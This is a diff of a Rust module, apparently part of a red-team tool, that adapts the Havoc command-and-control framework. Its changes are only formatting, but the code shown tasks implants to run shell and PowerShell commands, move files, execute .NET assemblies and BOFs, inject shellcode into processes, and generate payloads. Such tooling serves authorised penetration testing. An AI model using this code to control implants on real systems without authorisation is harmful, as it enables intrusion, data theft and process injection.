@@ -9,8 +9,8 @@
 //! Reference: <https://github.com/HavocFramework/Havoc>
 
 use super::{
-    C2Auth, C2Channel, C2Config, C2Framework, C2Listener, C2Session, C2TaskResult,
-    ImplantRequest, SessionType,
+    C2Auth, C2Channel, C2Config, C2Framework, C2Listener, C2Session, C2TaskResult, ImplantRequest,
+    SessionType,
 };
 use crate::error::{OverthroneError, Result};
 use async_trait::async_trait;
@@ -115,9 +115,7 @@ impl HavocChannel {
     /// Check HTTP response status, returning structured errors for 4xx/5xx.
     async fn check_response(resp: reqwest::Response) -> Result<reqwest::Response> {
         let status = resp.status();
-        if status == reqwest::StatusCode::UNAUTHORIZED
-            || status == reqwest::StatusCode::FORBIDDEN
-        {
+        if status == reqwest::StatusCode::UNAUTHORIZED || status == reqwest::StatusCode::FORBIDDEN {
             return Err(OverthroneError::C2(
                 "Havoc API authentication failed — check token/password".into(),
             ));
@@ -156,9 +154,10 @@ impl HavocChannel {
             .map_err(|e| OverthroneError::C2(format!("Parse command response: {e}")))?;
 
         if let Some(err) = &cmd_resp.error
-            && !err.is_empty() {
-                return Err(OverthroneError::C2(format!("Havoc error: {err}")));
-            }
+            && !err.is_empty()
+        {
+            return Err(OverthroneError::C2(format!("Havoc error: {err}")));
+        }
 
         let task_id = cmd_resp
             .task_id
@@ -180,30 +179,29 @@ impl HavocChannel {
 
             let poll_url = format!("/demons/{agent_id}/tasks/{task_id}");
             if let Ok(resp) = self.api_get(&poll_url).await
-                && let Ok(task) = resp.json::<HavocTaskResultResp>().await {
-                    if task.status == "completed" || task.status == "done" {
-                        return Ok(C2TaskResult {
-                            task_id: task.task_id,
-                            success: task.error.as_deref().unwrap_or("").is_empty(),
-                            output: task.output.unwrap_or_default(),
-                            error: task.error.unwrap_or_default(),
-                            raw_data: None,
-                            duration: start.elapsed(),
-                        });
-                    }
-                    if task.status == "error" {
-                        return Ok(C2TaskResult {
-                            task_id: task.task_id,
-                            success: false,
-                            output: task.output.unwrap_or_default(),
-                            error: task
-                                .error
-                                .unwrap_or_else(|| "Unknown task error".into()),
-                            raw_data: None,
-                            duration: start.elapsed(),
-                        });
-                    }
+                && let Ok(task) = resp.json::<HavocTaskResultResp>().await
+            {
+                if task.status == "completed" || task.status == "done" {
+                    return Ok(C2TaskResult {
+                        task_id: task.task_id,
+                        success: task.error.as_deref().unwrap_or("").is_empty(),
+                        output: task.output.unwrap_or_default(),
+                        error: task.error.unwrap_or_default(),
+                        raw_data: None,
+                        duration: start.elapsed(),
+                    });
                 }
+                if task.status == "error" {
+                    return Ok(C2TaskResult {
+                        task_id: task.task_id,
+                        success: false,
+                        output: task.output.unwrap_or_default(),
+                        error: task.error.unwrap_or_else(|| "Unknown task error".into()),
+                        raw_data: None,
+                        duration: start.elapsed(),
+                    });
+                }
+            }
 
             tokio::time::sleep(Duration::from_secs(2)).await;
         }
@@ -266,19 +264,20 @@ impl C2Channel for HavocChannel {
 
         // Fetch server info
         if let Ok(resp) = self.api_get("/server/info").await
-            && let Ok(info) = resp.json::<HavocServerInfoResp>().await {
-                if let Some(ver) = info.version {
-                    self.server_info.insert("version".into(), ver);
-                }
-                if let Some(lc) = info.listeners_count {
-                    self.server_info
-                        .insert("listeners_count".into(), lc.to_string());
-                }
-                if let Some(dc) = info.demons_count {
-                    self.server_info
-                        .insert("demons_count".into(), dc.to_string());
-                }
+            && let Ok(info) = resp.json::<HavocServerInfoResp>().await
+        {
+            if let Some(ver) = info.version {
+                self.server_info.insert("version".into(), ver);
             }
+            if let Some(lc) = info.listeners_count {
+                self.server_info
+                    .insert("listeners_count".into(), lc.to_string());
+            }
+            if let Some(dc) = info.demons_count {
+                self.server_info
+                    .insert("demons_count".into(), dc.to_string());
+            }
+        }
 
         self.connected = true;
         log::info!("[c2:havoc] Connected to Havoc at {}", self.base_url);
@@ -337,24 +336,12 @@ impl C2Channel for HavocChannel {
             .ok_or_else(|| OverthroneError::C2(format!("Demon {session_id} not found")))
     }
 
-    async fn exec_command(
-        &self,
-        session_id: &str,
-        command: &str,
-    ) -> Result<C2TaskResult> {
-        self.task_demon(
-            session_id,
-            "shell",
-            serde_json::json!({ "Args": command }),
-        )
-        .await
+    async fn exec_command(&self, session_id: &str, command: &str) -> Result<C2TaskResult> {
+        self.task_demon(session_id, "shell", serde_json::json!({ "Args": command }))
+            .await
     }
 
-    async fn exec_powershell(
-        &self,
-        session_id: &str,
-        script: &str,
-    ) -> Result<C2TaskResult> {
+    async fn exec_powershell(&self, session_id: &str, script: &str) -> Result<C2TaskResult> {
         self.task_demon(
             session_id,
             "powershell",
@@ -369,10 +356,8 @@ impl C2Channel for HavocChannel {
         local_data: &[u8],
         remote_path: &str,
     ) -> Result<C2TaskResult> {
-        let encoded = base64::Engine::encode(
-            &base64::engine::general_purpose::STANDARD,
-            local_data,
-        );
+        let encoded =
+            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, local_data);
         self.task_demon(
             session_id,
             "upload",
@@ -384,11 +369,7 @@ impl C2Channel for HavocChannel {
         .await
     }
 
-    async fn download_file(
-        &self,
-        session_id: &str,
-        remote_path: &str,
-    ) -> Result<C2TaskResult> {
+    async fn download_file(&self, session_id: &str, remote_path: &str) -> Result<C2TaskResult> {
         self.task_demon(
             session_id,
             "download",
@@ -403,10 +384,8 @@ impl C2Channel for HavocChannel {
         assembly_data: &[u8],
         args: &str,
     ) -> Result<C2TaskResult> {
-        let encoded = base64::Engine::encode(
-            &base64::engine::general_purpose::STANDARD,
-            assembly_data,
-        );
+        let encoded =
+            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, assembly_data);
         self.task_demon(
             session_id,
             "dotnet",
@@ -424,14 +403,9 @@ impl C2Channel for HavocChannel {
         bof_data: &[u8],
         args: &[u8],
     ) -> Result<C2TaskResult> {
-        let bof_encoded = base64::Engine::encode(
-            &base64::engine::general_purpose::STANDARD,
-            bof_data,
-        );
-        let args_encoded = base64::Engine::encode(
-            &base64::engine::general_purpose::STANDARD,
-            args,
-        );
+        let bof_encoded =
+            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, bof_data);
+        let args_encoded = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, args);
         self.task_demon(
             session_id,
             "inline-execute",
@@ -449,10 +423,8 @@ impl C2Channel for HavocChannel {
         shellcode: &[u8],
         target_pid: u32,
     ) -> Result<C2TaskResult> {
-        let sc_encoded = base64::Engine::encode(
-            &base64::engine::general_purpose::STANDARD,
-            shellcode,
-        );
+        let sc_encoded =
+            base64::Engine::encode(&base64::engine::general_purpose::STANDARD, shellcode);
         self.task_demon(
             session_id,
             "inject",
@@ -474,9 +446,10 @@ impl C2Channel for HavocChannel {
 
         let start = std::time::Instant::now();
         let resp = self.api_post("/payload/generate", &body).await?;
-        let raw = resp.bytes().await.map_err(|e| {
-            OverthroneError::C2(format!("Read payload data: {e}"))
-        })?;
+        let raw = resp
+            .bytes()
+            .await
+            .map_err(|e| OverthroneError::C2(format!("Read payload data: {e}")))?;
 
         Ok(C2TaskResult {
             task_id: format!("havoc-deploy-{}", uuid::Uuid::new_v4().as_simple()),
@@ -517,17 +490,18 @@ impl C2Channel for HavocChannel {
         let mut info = self.server_info.clone();
 
         if let Ok(resp) = self.api_get("/server/info").await
-            && let Ok(si) = resp.json::<HavocServerInfoResp>().await {
-                if let Some(v) = si.version {
-                    info.insert("version".into(), v);
-                }
-                if let Some(lc) = si.listeners_count {
-                    info.insert("listeners_count".into(), lc.to_string());
-                }
-                if let Some(dc) = si.demons_count {
-                    info.insert("demons_count".into(), dc.to_string());
-                }
+            && let Ok(si) = resp.json::<HavocServerInfoResp>().await
+        {
+            if let Some(v) = si.version {
+                info.insert("version".into(), v);
             }
+            if let Some(lc) = si.listeners_count {
+                info.insert("listeners_count".into(), lc.to_string());
+            }
+            if let Some(dc) = si.demons_count {
+                info.insert("demons_count".into(), dc.to_string());
+            }
+        }
 
         Ok(info)
     }
